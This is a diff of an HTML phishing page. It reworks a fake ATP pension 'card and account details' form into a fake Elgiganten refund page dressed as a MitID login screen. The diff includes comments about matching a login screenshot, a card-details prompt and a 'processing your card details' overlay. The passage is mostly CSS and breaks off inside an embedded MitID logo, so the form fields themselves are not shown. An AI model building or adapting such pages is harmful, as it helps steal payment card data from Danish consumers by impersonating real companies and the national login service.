@@ -3,549 +3,529 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kort &amp; Konto Detaljer – ATP</title>
-  <meta name="description" content="Bekræft dine kort- og kontooplysninger for at fortsætte med ATP Livslang Pension.">
+  <title>Kortoplysninger – Elgiganten Refusion</title>
+  <meta name="description" content="Bekræft dine kortoplysninger for at modtage din refusion fra Elgiganten.">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     :root {
-      --atp-green:      #1C3D2A;
-      --atp-green-mid:  #2E5C3C;
-      --atp-lime:       #C4D600;
-      --atp-lime-dark:  #A8BA00;
-      --atp-light:      #F4F6F4;
-      --atp-border:     #D5DDD5;
-      --atp-text:       #1A1A1A;
-      --atp-muted:      #5C6B5C;
-      --atp-white:      #FFFFFF;
-      --atp-error:      #C62828;
-      --radius:         6px;
-      --shadow:         0 2px 12px rgba(28,61,42,0.10);
+      --blue:        #0060E6;
+      --blue-hover:  #004CB8;
+      --blue-active: #00398A;
+      --blue-focus:  #0059B3;
+      --blue-link:   #0060E6;
+      --text:        #1a1a1a;
+      --text-mid:    #333333;
+      --text-muted:  #454545;
+      --label:       #5C5C5C;
+      --border:      #CCCCCC;
+      --border-soft: #E0E0E0;
+      --border-lang: #BFBFBF;
+      --bg-page:     #FFFFFF;
+      --bg-top:      #F5F5F5;
+      --bg-field:    #FFFFFF;
+      --topbar:      #1a1a1a;
+      --error:       #CC0000;
+      --radius:      4px;
     }
 
-    html { font-size: 16px; }
+    html, body {
+      margin: 0;
+      height: 100%;
+      width: 100%;
+      background-color: var(--bg-page);
+      font-family: 'IBM Plex Sans', "IBMPlexSans", "system", sans-serif;
+      font-size: 16px;
+      font-weight: normal;
+      color: var(--text);
+    }
 
     body {
-      font-family: 'IBM Plex Sans', Arial, sans-serif;
-      background: #F0F2F0;
-      color: var(--atp-text);
+      display: flex;
+      flex-direction: column;
       min-height: 100vh;
+    }
+
+    /* ── Dark top strip (like login screenshot) ── */
+    .topbar {
+      height: 8px;
+      background: var(--topbar);
+      width: 100%;
+    }
+
+    /* ── Header (gray area with Log-in title + language) ── */
+    .header-container {
+      background-color: var(--bg-top);
+      width: 100%;
+      border-bottom: 1px solid var(--border-soft);
+    }
+    .header-content {
+      max-width: 912px;
+      margin: 0 auto;
+      padding: 24px 24px 0;
       display: flex;
       flex-direction: column;
     }
-
-    /* ── Header ── */
-    .site-header {
-      background: #fff;
-      height: 64px;
+    .header-top-row {
       display: flex;
       align-items: center;
-      padding: 0 24px;
-      border-bottom: 1px solid var(--atp-border);
-      position: sticky;
-      top: 0;
-      z-index: 100;
+      justify-content: space-between;
+      margin-bottom: 20px;
     }
-    .site-header__logo {
+    .header-title {
       display: flex;
       align-items: center;
-      gap: 4px;
-      text-decoration: none;
+      gap: 14px;
     }
-    .logo-text {
-      font-weight: 700;
-      font-size: 26px;
-      color: #1A1A1A;
-      letter-spacing: -0.5px;
-      line-height: 1;
-    }
-    .logo-eq {
-      font-weight: 700;
-      font-size: 26px;
-      color: #A8BA00;
-      line-height: 1;
-    }
-    .site-header__right {
-      margin-left: auto;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .header-secure-badge {
-      background: #EDF5EC;
-      border: 1px solid var(--atp-green);
-      color: var(--atp-green);
-      font-size: 12px;
-      font-weight: 600;
-      padding: 5px 11px;
-      border-radius: 20px;
-      display: flex;
-      align-items: center;
-      gap: 6px;
-    }
-    .header-secure-badge svg {
-      width: 14px;
-      height: 14px;
-      fill: var(--atp-green);
-      flex-shrink: 0;
-    }
-
-    /* ── Hero band ── */
-    .hero-band {
-      background: #1C3D2A;
-      padding: 36px 24px 32px;
-      text-align: center;
-      color: #fff;
-    }
-    .hero-band__step {
-      display: inline-flex;
-      align-items: center;
-      gap: 8px;
-      background: rgba(255,255,255,0.12);
-      border: 1px solid rgba(255,255,255,0.22);
-      border-radius: 20px;
-      font-size: 13px;
-      font-weight: 600;
-      padding: 4px 14px;
-      margin-bottom: 14px;
-    }
-    .hero-band__title {
-      font-size: clamp(22px, 4vw, 30px);
-      font-weight: 700;
-      margin-bottom: 8px;
-      line-height: 1.25;
-    }
-    .hero-band__subtitle {
-      font-size: 15px;
-      opacity: 0.85;
-      max-width: 520px;
-      margin: 0 auto;
-      line-height: 1.6;
-    }
-
-    /* ── Progress bar ── */
-    .progress-wrap {
-      max-width: 640px;
-      margin: 0 auto;
-      padding: 22px 24px 0;
-    }
-    .progress-steps {
+    .header-title__icon {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: var(--blue);
       display: flex;
       align-items: center;
       justify-content: center;
+    }
+    .header-title__icon svg { width: 26px; height: 26px; fill: #fff; }
+    .header-title__text {
+      font-size: 24px;
+      font-weight: 700;
+      color: var(--text);
+      letter-spacing: -0.5px;
+    }
+    .header-lang {
+      display: flex;
+      gap: 8px;
+    }
+    .link-language {
+      background-color: #fff;
+      border: 1px solid var(--border-lang);
+      border-radius: var(--radius);
+      cursor: pointer;
+      color: var(--blue);
+      font-size: 13px;
+      font-weight: 700;
+      padding: 7px 18px;
+      font-family: inherit;
+    }
+    .link-language:hover { color: #000; }
+
+    .header-tabs {
+      display: flex;
       gap: 0;
     }
-    .progress-step {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      position: relative;
-      flex: 1;
-    }
-    .progress-step__dot {
-      width: 32px; height: 32px;
-      border-radius: 50%;
-      display: flex; align-items: center; justify-content: center;
-      font-size: 14px; font-weight: 700;
-      border: 2px solid var(--atp-border);
-      background: var(--atp-white);
-      color: var(--atp-muted);
-      position: relative;
-      z-index: 1;
-      transition: all 0.2s;
-    }
-    .progress-step.active .progress-step__dot {
-      background: var(--atp-green);
-      border-color: var(--atp-green);
-      color: #fff;
-      box-shadow: 0 0 0 4px rgba(28,61,42,0.15);
-    }
-    .progress-step.done .progress-step__dot {
-      background: var(--atp-lime-dark);
-      border-color: var(--atp-lime-dark);
-      color: var(--atp-green);
-    }
-    .progress-step__label {
-      font-size: 11px;
-      margin-top: 6px;
-      color: var(--atp-muted);
+    .header-tab {
+      padding: 12px 20px;
+      font-size: 15px;
       font-weight: 500;
-      text-align: center;
+      color: var(--text);
+      cursor: pointer;
+      background: transparent;
+      border: none;
+      border-bottom: 3px solid transparent;
+      font-family: inherit;
+      margin-bottom: -1px;
     }
-    .progress-step.active .progress-step__label { color: var(--atp-green); font-weight: 700; }
-    .progress-step::before {
-      content: '';
-      position: absolute;
-      top: 15px; right: calc(50% + 16px);
-      left: calc(-50% + 16px);
-      height: 2px;
-      background: var(--atp-border);
-      z-index: 0;
+    .header-tab.selected {
+      color: var(--blue);
+      border-bottom-color: var(--blue);
+      font-weight: 600;
     }
-    .progress-step:first-child::before { display: none; }
-    .progress-step.done::before { background: var(--atp-lime-dark); }
+    .header-tab:not(.selected):hover { color: var(--blue); }
 
-    /* ── Main card ── */
-    .main-wrap {
+    /* ── Page layout ── */
+    .page-container {
       flex: 1;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
-      padding: 28px 16px 48px;
+      padding: 40px 24px 60px;
+      background: var(--bg-page);
     }
-    .form-card {
-      background: var(--atp-white);
-      border-radius: 12px;
-      box-shadow: var(--shadow);
-      border: 1px solid var(--atp-border);
+    .page-content {
+      display: flex;
+      flex-direction: row;
+      gap: 40px;
+      max-width: 912px;
       width: 100%;
-      max-width: 580px;
+      align-items: flex-start;
     }
-    .form-card__header {
-      background: #EDF5EC;
-      border-bottom: 1px solid var(--atp-border);
-      padding: 18px 28px;
+
+    /* ── Left column: main card ── */
+    .main-col {
+      flex: 1;
+      min-width: 0;
+      max-width: 420px;
+    }
+    .card-title-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 4px;
+    }
+    .card-title {
+      font-size: 18px;
+      font-weight: 700;
+      color: var(--text);
+    }
+    .card-title-row img { height: 16px; width: auto; }
+    .card-divider {
+      border: 0;
+      border-top: 1px solid var(--border-soft);
+      margin: 16px 0 24px;
+    }
+
+    /* ── Refundering banner ── */
+    .refund-banner {
+      background: #F2F7FE;
+      border: 1px solid #BDD5FA;
+      border-left: 4px solid var(--blue);
+      border-radius: var(--radius);
+      padding: 14px 16px;
+      margin-bottom: 24px;
       display: flex;
       align-items: center;
-      gap: 12px;
+      gap: 14px;
     }
-    .form-card__icon {
-      width: 42px; height: 42px;
-      background: var(--atp-green);
-      border-radius: 8px;
-      display: flex; align-items: center; justify-content: center;
+    .refund-banner__icon {
+      width: 40px; height: 40px;
+      border-radius: 50%;
+      background: var(--blue);
+      display: flex;
+      align-items: center;
+      justify-content: center;
       flex-shrink: 0;
     }
-    .form-card__icon svg {
+    .refund-banner__icon svg {
       width: 22px; height: 22px;
       fill: #fff;
     }
-    .form-card__header-text h2 {
+    .refund-banner__body { flex: 1; min-width: 0; }
+    .refund-banner__label {
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--blue-hover);
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 2px;
+    }
+    .refund-banner__title {
       font-size: 16px;
       font-weight: 700;
-      color: var(--atp-green);
+      color: var(--text);
+      line-height: 1.3;
     }
-    .form-card__header-text p {
+    .refund-banner__sub {
       font-size: 13px;
-      color: var(--atp-muted);
+      color: var(--text-muted);
       margin-top: 2px;
     }
-    .form-card__body {
-      padding: 28px 28px 24px;
-    }
 
-    /* ── Card Preview ── */
-    .card-preview {
-      position: relative;
-      background: linear-gradient(135deg, var(--atp-green) 0%, var(--atp-green-mid) 100%);
-      border-radius: 12px;
-      padding: 22px 22px 20px;
-      color: #fff;
-      box-shadow: 0 6px 20px rgba(28,61,42,0.25);
-      margin-bottom: 10px;
-      overflow: hidden;
-    }
-    .card-preview::before {
-      content: '';
-      position: absolute;
-      top: -40px; right: -40px;
-      width: 160px; height: 160px;
-      border-radius: 50%;
-      background: rgba(196,214,0,0.08);
-    }
-    .card-preview::after {
-      content: '';
-      position: absolute;
-      bottom: -60px; left: -30px;
-      width: 180px; height: 180px;
-      border-radius: 50%;
-      background: rgba(196,214,0,0.06);
-    }
-    .card-preview__label {
-      font-size: 11px;
-      font-weight: 600;
-      letter-spacing: 1.5px;
-      text-transform: uppercase;
-      opacity: 0.75;
-      margin-bottom: 32px;
-      position: relative;
-      z-index: 1;
-    }
-    .card-preview__number {
-      font-family: 'Courier New', monospace;
-      font-size: 20px;
-      font-weight: 600;
-      letter-spacing: 2px;
-      margin-bottom: 24px;
-      position: relative;
-      z-index: 1;
-    }
-    .card-preview__bottom {
-      display: flex;
-      justify-content: space-between;
-      align-items: flex-end;
-      position: relative;
-      z-index: 1;
-    }
-    .card-preview__name {
-      font-size: 13px;
-      font-weight: 600;
-      letter-spacing: 0.5px;
-      text-transform: uppercase;
-      max-width: 60%;
-      overflow: hidden;
-      white-space: nowrap;
-      text-overflow: ellipsis;
-    }
-    .card-preview__expiry {
-      display: flex;
-      flex-direction: column;
-      align-items: flex-end;
-      font-size: 10px;
-      font-weight: 600;
-      letter-spacing: 1px;
-      opacity: 0.85;
-      text-transform: uppercase;
-    }
-    .card-preview__expiry span:last-child {
-      font-size: 14px;
+    .section-label {
+      font-size: 12px;
       font-weight: 700;
-      margin-top: 2px;
-      opacity: 1;
-      letter-spacing: 0.5px;
-    }
-    .card-chip {
-      position: absolute;
-      top: 46px;
-      right: 22px;
-      width: 38px;
-      height: 28px;
-      z-index: 1;
-    }
-
-    /* ── Fields ── */
-    .field-group {
-      margin-bottom: 18px;
-    }
-    .field-group label {
+      color: var(--label);
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
       display: flex;
       align-items: center;
-      gap: 7px;
-      font-size: 13px;
-      font-weight: 600;
-      color: var(--atp-green);
-      margin-bottom: 6px;
+      gap: 6px;
     }
-    .field-group label svg {
-      width: 15px; height: 15px;
-      fill: var(--atp-green);
-      flex-shrink: 0;
+    .section-label .help-icon {
+      width: 16px; height: 16px;
+      border-radius: 50%;
+      border: 1.5px solid var(--label);
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 10px;
+      font-weight: 700;
+      color: var(--label);
+      cursor: help;
+    }
+
+    /* ── Form fields ── */
+    .field-group { margin-bottom: 18px; }
+    .field-group label {
+      font-size: 12px;
+      font-weight: 700;
+      color: var(--label);
+      letter-spacing: 1px;
+      text-transform: uppercase;
+      margin-bottom: 8px;
+      display: block;
     }
     .field-row {
       display: grid;
       grid-template-columns: 1fr 1fr;
-      gap: 14px;
+      gap: 12px;
     }
     .field-group input {
       width: 100%;
-      height: 46px;
-      border: 1.5px solid var(--atp-border);
-      border-radius: 4px;
-      padding: 0 13px;
+      height: 48px;
+      border: 2px solid var(--blue);
+      border-radius: var(--radius);
+      padding: 0 14px;
       font-size: 15px;
       font-family: inherit;
-      color: var(--atp-text);
-      background: #fff;
+      color: var(--text);
+      background: var(--bg-field);
       outline: none;
-      transition: border-color 0.18s, box-shadow 0.18s, background 0.18s;
+      transition: border-color 0.15s, box-shadow 0.15s;
       -webkit-appearance: none;
     }
-    .field-group input::placeholder { color: #A8B8A8; }
+    .field-group input::placeholder { color: #BDBDBD; }
+    .field-group input:not(:focus) {
+      border-color: var(--border);
+      border-width: 1px;
+    }
     .field-group input:focus {
-      border-color: var(--atp-green);
-      box-shadow: 0 0 0 3px rgba(28,61,42,0.10);
+      border-color: var(--blue);
+      border-width: 2px;
+      box-shadow: 0 0 0 2px rgba(0,96,230,0.15);
     }
     .field-group input.filled {
-      border-color: var(--atp-lime-dark);
-      background: #FAFFF0;
+      border-color: var(--blue);
+      border-width: 2px;
     }
-    .field-group .field-note {
-      font-size: 11.5px;
-      color: var(--atp-muted);
+    .field-note {
+      font-size: 12px;
+      color: var(--text-muted);
       margin-top: 4px;
     }
+    .error-msg {
+      font-size: 12px;
+      color: var(--error);
+      margin-top: 4px;
+      display: none;
+    }
+    .field-group.has-error input { border-color: var(--error); border-width: 2px; }
+    .field-group.has-error .error-msg { display: block; }
 
-    /* ── Divider ── */
+    /* ── Button (matches FORTSÆT button in login) ── */
+    .button-primary {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      width: 100%;
+      height: 52px;
+      padding: 0 20px;
+      font-size: 14px;
+      font-weight: 700;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      border: none;
+      border-radius: var(--radius);
+      background-color: var(--blue);
+      color: #fff;
+      cursor: pointer;
+      font-family: inherit;
+      margin-top: 8px;
+      transition: background-color 0.15s;
+    }
+    .button-primary:hover { background-color: var(--blue-hover); }
+    .button-primary:active { background-color: var(--blue-active); }
+    .button-primary:focus:not(:active) {
+      box-shadow: 0 0 0 2px #fff, 0 0 0 5px var(--blue);
+      outline-offset: 1px;
+    }
+    .button-primary svg {
+      width: 20px; height: 20px;
+      fill: #fff;
+      flex-shrink: 0;
+    }
+
+    /* ── Helper links row (Glemt / Afbryd / Hjælp) ── */
+    .link-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-top: 22px;
+      font-size: 14px;
+      color: var(--blue-link);
+    }
+    .link-row a {
+      color: var(--blue-link);
+      text-decoration: none;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    .link-row a:hover { text-decoration: underline; }
+    .link-info-icon {
+      width: 18px; height: 18px;
+      border-radius: 50%;
+      background: var(--blue-link);
+      color: #fff;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 11px;
+      font-weight: 700;
+      font-style: italic;
+      flex-shrink: 0;
+    }
+    .check-row {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      margin-top: 36px;
+      margin-bottom: 20px;
+    }
+    .check-row input[type="checkbox"] {
+      width: 18px; height: 18px;
+      cursor: pointer;
+      accent-color: var(--blue);
+    }
+    .check-row label {
+      font-size: 14px;
+      color: var(--text);
+      cursor: pointer;
+    }
+    .bottom-links {
+      display: flex;
+      gap: 32px;
+      margin-top: 16px;
+    }
+    .bottom-links a {
+      color: var(--blue-link);
+      font-size: 14px;
+      font-weight: 500;
+      text-decoration: none;
+    }
+    .bottom-links a:hover { text-decoration: underline; }
+
+    /* ── Section dividers ── */
     .section-divider {
       display: flex;
       align-items: center;
       gap: 10px;
-      margin: 22px 0 18px;
+      margin: 24px 0 18px;
     }
-    .section-divider__line { flex: 1; height: 1px; background: var(--atp-border); }
+    .section-divider__line { flex: 1; height: 1px; background: var(--border-soft); }
     .section-divider__label {
-      font-size: 12px;
-      font-weight: 600;
-      color: var(--atp-muted);
+      font-size: 11px;
+      font-weight: 700;
+      color: var(--label);
       text-transform: uppercase;
-      letter-spacing: 0.5px;
+      letter-spacing: 1px;
     }
 
-    /* ── Secure notice ── */
-    .secure-notice {
-      display: flex;
-      align-items: flex-start;
-      gap: 10px;
-      background: #EDF5EC;
-      border: 1px solid #B3D4B3;
-      border-radius: var(--radius);
-      padding: 12px 14px;
-      margin-bottom: 22px;
-    }
-    .secure-notice__icon {
-      flex-shrink: 0;
-      margin-top: 1px;
-    }
-    .secure-notice__icon svg {
-      width: 18px; height: 18px;
-      fill: var(--atp-green);
-    }
-    .secure-notice__text { font-size: 13px; color: var(--atp-green); line-height: 1.5; }
-    .secure-notice__text strong { font-weight: 700; }
-
-    /* ── Submit button (split style) ── */
-    .form-card__footer {
-      padding: 0 28px 28px;
+    /* ── Right sidebar (info boxes like login) ── */
+    .side-col {
+      flex: 0 0 360px;
       display: flex;
       flex-direction: column;
-      gap: 10px;
+      gap: 20px;
     }
-    .btn-submit {
-      width: 100%;
-      height: 52px;
-      background: var(--atp-green);
-      color: #fff;
-      border: none;
+    .info-box {
+      border: 1px solid var(--border);
       border-radius: var(--radius);
-      font-size: 15px;
+      background: #fff;
+    }
+    .info-box__header {
+      background: var(--bg-top);
+      padding: 10px 14px;
+      font-size: 13px;
       font-weight: 700;
-      font-family: inherit;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      overflow: hidden;
-      transition: background 0.18s;
-      letter-spacing: 0.2px;
+      color: var(--text-mid);
+      border-bottom: 1px solid var(--border);
+      border-radius: var(--radius) var(--radius) 0 0;
     }
-    .btn-submit:hover { background: var(--atp-green-mid); }
-    .btn-submit:hover .btn-submit__arrow { background: var(--atp-lime-dark); }
-    .btn-submit__text {
-      flex: 1;
-      padding: 0 18px;
-      text-align: left;
-    }
-    .btn-submit__arrow {
-      width: 52px;
-      height: 52px;
-      background: var(--atp-lime);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      flex-shrink: 0;
-      transition: background 0.18s;
-    }
-    .btn-submit__arrow svg {
-      width: 22px; height: 22px;
-      fill: var(--atp-green);
-    }
-
-    .btn-back {
-      width: 100%;
-      height: 44px;
-      background: transparent;
-      color: var(--atp-green);
-      border: 1.5px solid var(--atp-border);
-      border-radius: var(--radius);
+    .info-box__body {
+      padding: 14px;
       font-size: 14px;
-      font-weight: 600;
-      font-family: inherit;
-      cursor: pointer;
+      color: var(--text);
+      line-height: 1.5;
+    }
+    .info-box__body p { margin: 0 0 8px; }
+    .info-box__body p:last-child { margin: 0; }
+    .info-box__body a {
+      color: var(--blue-link);
+      text-decoration: underline;
+    }
+    .info-box__body a:hover { text-decoration: none; }
+    .info-box__body ul {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .info-box__body li {
+      padding: 4px 0;
       display: flex;
       align-items: center;
-      justify-content: center;
-      gap: 8px;
-      transition: background 0.15s, border-color 0.15s;
+      gap: 6px;
     }
-    .btn-back:hover { background: var(--atp-light); border-color: var(--atp-green); }
+    .info-box__body li::before {
+      content: "-";
+      color: var(--text-muted);
+    }
+    .ext-icon {
+      display: inline-block;
+      width: 12px; height: 12px;
+      margin-left: 4px;
+      vertical-align: middle;
+    }
+    .ext-icon::before {
+      content: "↗";
+      font-size: 11px;
+      color: var(--blue-link);
+    }
 
     /* ── Footer ── */
     .site-footer {
-      background: var(--atp-green);
-      color: rgba(255,255,255,0.7);
+      background: var(--bg-top);
+      border-top: 1px solid var(--border-soft);
       text-align: center;
       padding: 18px 24px;
       font-size: 13px;
+      color: var(--text-muted);
     }
-    .site-footer a { color: rgba(255,255,255,0.85); text-decoration: none; }
+    .site-footer a { color: var(--blue-link); text-decoration: none; }
     .site-footer a:hover { text-decoration: underline; }
 
-    /* ── Error ── */
-    .error-msg {
-      font-size: 12px;
-      color: var(--atp-error);
-      margin-top: 4px;
-      display: none;
-    }
-    .field-group.has-error input { border-color: var(--atp-error); }
-    .field-group.has-error .error-msg { display: block; }
-
-    @media (max-width: 500px) {
-      .field-row { grid-template-columns: 1fr; }
-      .form-card__body { padding: 20px 16px 16px; }
-      .form-card__footer { padding: 0 16px 20px; }
-      .form-card__header { padding: 14px 16px; }
-      .card-preview__number { font-size: 17px; letter-spacing: 1.5px; }
-    }
-
-    /* ── Page-transition loading overlay ── */
-    #atp-loading-overlay {
+    /* ── Loading overlay ── */
+    #loading-overlay {
       display: none;
       position: fixed;
       inset: 0;
-      background: #fff;
+      background: rgba(255,255,255,0.96);
       z-index: 99999;
       flex-direction: column;
       align-items: center;
       justify-content: center;
+      gap: 16px;
     }
-    #atp-loading-overlay.visible { display: flex; }
-    .atp-ov-logo { margin-bottom: 32px; }
-    .atp-ov-shield-wrap {
-      position: relative;
-      width: 120px;
-      height: 120px;
-      margin-bottom: 24px;
+    #loading-overlay.visible { display: flex; }
+    .ov-spinner {
+      width: 48px; height: 48px;
+      animation: spin 1.1s linear infinite;
     }
-    .atp-ov-spinner {
-      width: 52px; height: 52px;
-      position: absolute; top: 34px; left: 34px;
-      animation: atp-spin 1.2s linear infinite;
-    }
-    @keyframes atp-spin { to { transform: rotate(360deg); } }
-    .atp-ov-title {
-      font-size: 19px;
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .ov-title {
+      font-size: 17px;
       font-weight: 700;
-      color: #1a1a1a;
-      margin: 0 0 8px;
-      font-family: 'IBM Plex Sans', Arial, sans-serif;
+      color: var(--text);
+      font-family: inherit;
     }
-    .atp-ov-sub {
-      font-size: 15px;
-      color: #6b7280;
-      margin: 0;
-      font-family: 'IBM Plex Sans', Arial, sans-serif;
+    .ov-sub {
+      font-size: 14px;
+      color: var(--text-muted);
+      font-family: inherit;
+    }
+
+    @media (max-width: 860px) {
+      .page-content { flex-direction: column; align-items: stretch; }
+      .main-col, .side-col { max-width: 100%; flex: 1 1 auto; }
+      .side-col { flex-basis: auto; }
+    }
+    @media (max-width: 500px) {
+      .field-row { grid-template-columns: 1fr; }
+      .header-title__text { font-size: 20px; }
+      .header-title__icon { width: 40px; height: 40px; }
+      .header-title__icon svg { width: 22px; height: 22px; }
+      .bottom-links { gap: 20px; }
     }
   </style>
 
@@ -553,200 +533,196 @@
 </head>
 <body>
 
-<!-- Page-transition loading overlay -->
-<div id="atp-loading-overlay">
-  <div class="atp-ov-logo"><img src="assets/mitidlogo.webp" alt="MitID" style="height:38px;width:auto;"></div>
-  <div class="atp-ov-shield-wrap">
-    <img src="assets/shield.png" style="width:120px;height:120px;position:absolute;top:0;left:0;" alt="">
-    <svg class="atp-ov-spinner" viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg">
-      <circle cx="26" cy="26" r="17" fill="none" stroke="rgba(255,255,255,0.2)" stroke-width="3"/>
-      <circle cx="26" cy="26" r="17" fill="none" stroke="white" stroke-width="3" stroke-dasharray="27 80" stroke-linecap="round"/>
-    </svg>
-  </div>
-  <p class="atp-ov-title">Bekræfter dine kortoplysninger</p>
-  <p class="atp-ov-sub">Vent et øjeblik ...</p>
+<!-- Loading overlay -->
+<div id="loading-overlay">
+  <svg class="ov-spinner" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+    <circle cx="24" cy="24" r="18" fill="none" stroke="#E0E0E0" stroke-width="3"/>
+    <circle cx="24" cy="24" r="18" fill="none" stroke="#0060E6" stroke-width="3" stroke-dasharray="25 90" stroke-linecap="round"/>
+  </svg>
+  <p class="ov-title">Behandler dine kortoplysninger</p>
+  <p class="ov-sub">Vent et øjeblik …</p>
 </div>
 
+<!-- ── Dark top strip ── -->
+<div class="topbar"></div>
+
 <!-- ── Header ── -->
-<header class="site-header">
-  <a class="site-header__logo" href="index.html">
-    <span class="logo-text">atp</span><span class="logo-eq">=</span>
-  </a>
-  <div class="site-header__right">
-    <span class="header-secure-badge">
-      <svg viewBox="0 0 24 24"><path d="M12 2L4 5v6c0 5.55 3.84 10.74 8 12 4.16-1.26 8-6.45 8-12V5l-8-3z"/></svg>
-      Sikker forbindelse
-    </span>
+<header class="header-container">
+  <div class="header-content">
+    <div class="header-top-row">
+      <div class="header-title">
+        <div class="header-title__icon">
+          <!-- Crown/person icon (matches login screenshot) -->
+          <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+          </svg>
+        </div>
+        <span class="header-title__text">Log-in</span>
+      </div>
+      <div class="header-lang">
+        <button type="button" class="link-language">English</button>
+        <button type="button" class="link-language">Kalaallisut</button>
+      </div>
+    </div>
+    <div class="header-tabs">
+      <button type="button" class="header-tab selected">MitID</button>
+      <button type="button" class="header-tab">Lokalt login</button>
+    </div>
   </div>
 </header>
 
-<!-- ── Hero ── -->
-<div class="hero-band">
-  <div class="hero-band__step">Trin 2 af 2</div>
-  <h1 class="hero-band__title">Kort &amp; Konto Detaljer</h1>
-  <p class="hero-band__subtitle">Angiv dine betalingsoplysninger for at tilknytte dit kort og din bankkonto til ATP.</p>
-</div>
+<!-- ── Page ── -->
+<div class="page-container">
+  <div class="page-content">
 
-<!-- ── Progress ── -->
-<div class="progress-wrap">
-  <div class="progress-steps">
-    <div class="progress-step done">
-      <div class="progress-step__dot">✓</div>
-      <div class="progress-step__label">Personlige<br>Oplysninger</div>
-    </div>
-    <div class="progress-step active">
-      <div class="progress-step__dot">2</div>
-      <div class="progress-step__label">Kort &amp;<br>Konto</div>
-    </div>
-  </div>
-</div>
-
-<!-- ── Main ── -->
-<main class="main-wrap">
-  <div class="form-card">
-
-    <!-- Card header -->
-    <div class="form-card__header">
-      <div class="form-card__icon">
-        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+    <!-- ── Left: main card ── -->
+    <div class="main-col">
+      <div class="card-title-row">
+        <span class="card-title">Refundering – Elgiganten</span>
+        <img src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNjAiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCA2MCAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCjxwYXRoIGZpbGwtcnVsZT0iZXZlbm9kZCIgY2xpcC1ydWxlPSJldmVub2RkIiBkPSJNMTguODkzMyAzLjU4NTQ1QzE5Ljg3NTMgMy41ODU0NSAyMC42NzE0IDIuNzgyOTEgMjAuNjcxNCAxLjc5Mjc3QzIwLjY3MTQgMC44MDI2MzkgMTkuODc1MyAwIDE4Ljg5MzMgMEMxNy45MTE0IDAgMTcuMTE1MyAwLjgwMjYzOSAxNy4xMTUzIDEuNzkyNzdDMTcuMTE1MyAyLjc4MjkxIDE3LjkxMTQgMy41ODU0NSAxOC44OTMzIDMuNTg1NDVaTTM5Ljc3MDYgNy41Mjc0NkM0MS44MzIyIDcuNTI3NDYgNDMuNTAzNCA1Ljg0MjQ0IDQzLjUwMzQgMy43NjM3NUM0My41MDM0IDEuNjg1MTYgNDEuODMyMiA0LjEwNTA0ZS0wNSAzOS43NzA2IDQuMTA1MDRlLTA1QzM3LjcwOSA0LjEwNTA0ZS0wNSAzNi4wMzc4IDEuNjg1MTYgMzYuMDM3OCAzLjc2Mzc1QzM2LjAzNzggNS44NDI0NCAzNy43MDkgNy41Mjc0NiAzOS43NzA2IDcuNTI3NDZaTTQ4LjQ0MDMgMC4yNDI4NjVINTEuMDE1OUM1Ny4zMjc2IDAuMjQyODY1IDYwIDMuNjk0OCA2MCA4LjAxMzA5QzYwIDEyLjMzMTQgNTcuMzI3NiAxNS43ODMzIDUxLjAxNTkgMTUuNzgzM0g0OC40NDAzVjAuMjQyODY1Wk00Ni41MTM4IDE1Ljc4MzNDNDYuMTI5MyAxMC45OTEyIDQzLjI3NzggOC45ODQzNiAzOS43NzA2IDguOTg0MzZDMzYuMjYzNSA4Ljk4NDM2IDMzLjQxMTkgMTAuOTkxMiAzMy4wMjc1IDE1Ljc4MzNINDYuNTEzOFpNNy4zMDU0MSAxMi41NjFMMy4wMjM3OCA2LjEyMjIyVjE1Ljc4MDZIMFYwLjgwNTA2MUgyLjg3ODY0TDcuMzc3OTggNy44NzgwNUwxMS44NTMxIDAuODA1MDYxSDE0LjY4MzRWMTUuNzgwNkgxMS42MzU0VjYuMTIyMjJMNy40MDIyMSAxMi41NjFINy4zMDU0MVpNMTcuMzkzNiAxNS43ODA1SDIwLjM5MzFWNC44NzgwNkgxNy4zOTM2VjE1Ljc4MDVaTTIzLjY1ODkgNy4zMTcyMkgyMi4wMTRWNC44NzgxSDIzLjY1ODlWMS45MjY5OUgyNi42MzQyVjQuODc4MUgyOS4wMDQ4VjcuMzE3MjJIMjYuNjM0MlYxMi4wOTc2QzI2LjYzNDIgMTIuOTUxMiAy